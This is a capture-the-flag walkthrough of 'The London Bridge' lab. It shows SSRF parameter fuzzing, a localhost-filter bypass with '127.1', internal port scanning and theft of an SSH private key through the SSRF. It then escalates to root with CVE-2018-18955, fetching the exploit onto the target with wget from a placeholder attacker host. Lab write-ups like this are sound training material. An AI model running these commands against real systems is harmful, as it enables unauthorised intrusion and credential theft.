# The London Bridge 

**Difficulty:** Medium  
**Category:** SSRF , Kernel exploitation 

## Enumeration

Started with an Nmap scan to identify open ports and services.

```bash
nmap -p- -sCV -T4 -v  <TARGET_IP>
``` 

Open ports:

`22 — SSH
8080 — HTTP (Gunicorn)` 

Enumerated directories using Gobuster.

```bash
gobuster dir -u http://<TARGET_IP>:8080/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
``` 

Discovered the `/view_image` endpoint, which allowed the application to fetch images using URLs.

2. SSRF
Parameter Discovery

Used FFUF to discover the POST parameter accepted by /view_image.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-X POST \
-u 'http://<TARGET_IP>:8080/view_image' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'FUZZ=/uploads/01.jpg' \
-fw 
``` 


Identified the parameter `www`.

Localhost Filter Bypass

Direct requests to 127.0.0.1 were blocked. Used payloads from ssrf-cheat-sheet.txt to find an alternative localhost representation.

```bash
ffuf -w ssrf-cheat-sheet.txt \
-X POST \
-u 'http://<TARGET_IP>:8080/view_image' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'www=http://FUZZ' \
-fw
``` 


The scan identified `127.1` as a working localhost representation.

Internal Port Enumeration

Created a list of port numbers.

```bash
seq 1 65535 > ports.txt
``` 

Scanned internal services through SSRF.

```bash
ffuf -w ports.txt \
-X POST \
-u 'http://<TARGET_IP>:8080/view_image' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'www=http://127.1:FUZZ' \
-fw
``` 


Port 80 returned an internal web server.

Internal Directory Enumeration

Enumerated directories on the internal service.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-X POST \
-u 'http://<TARGET_IP>:8080/view_image' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'www=http://127.1:80/FUZZ' \
-fw 96 -ic
``` 

Found the .ssh directory containing authorized_keys and id_rsa.

Retrieved the SSH private key through SSRF.

```bash
curl -s -X POST \
'http://<TARGET_IP>:8080/view_image' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'www=http://127.1:80/.ssh/id_rsa' \
-o id_rsa
``` 

Retrieved authorized_keys to identify the account.

```bash
curl -s -X POST \
'http://<TARGET_IP>:8080/view_image' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'www=http://127.1:80/.ssh/authorized_keys'
``` 

The username was `beth`.

## Initial Access — SSH

Set the correct permissions on the private key and connected to the target.

```bash
chmod 600 id_rsa
ssh -i id_rsa beth@<TARGET_IP>
``` 

Enumerated the system and checked the kernel version.

```bash
id
uname -a
``` 

Located the user flag.
```bash
find / -type f -name 'user.txt' 2>/dev/null
cat /home/beth/__pycache__/user.txt
``` 

## Privilege Escalation — CVE-2018-18955

The kernel version was identified as:
`Linux 4.15.0-112-generic`
Identified CVE-2018-18955 as a potential local privilege-escalation vulnerability.
Downloading the Exploit
On the attacking machine, cloned the exploit repository.

```bash
git clone https://github.com/scheatkode/CVE-2018-18955.git
``` 

Started a Python HTTP server from the directory containing the repository.

```bash
python3 -m http.server 9000
``` 
On the target machine, downloaded the repository.

```bash
cd /tmp
wget -r http://<ATTACKER_IP>:9000/CVE-2018-18955/
``` 

Executing the Exploit

Made the D-Bus exploit executable and ran it.

```bash
chmod +x exploit.dbus.sh
./exploit.dbus.sh
``` 

After successful privilege escalation, retrieved the root flag.

```bash
cat /root/.root.txt
``` 
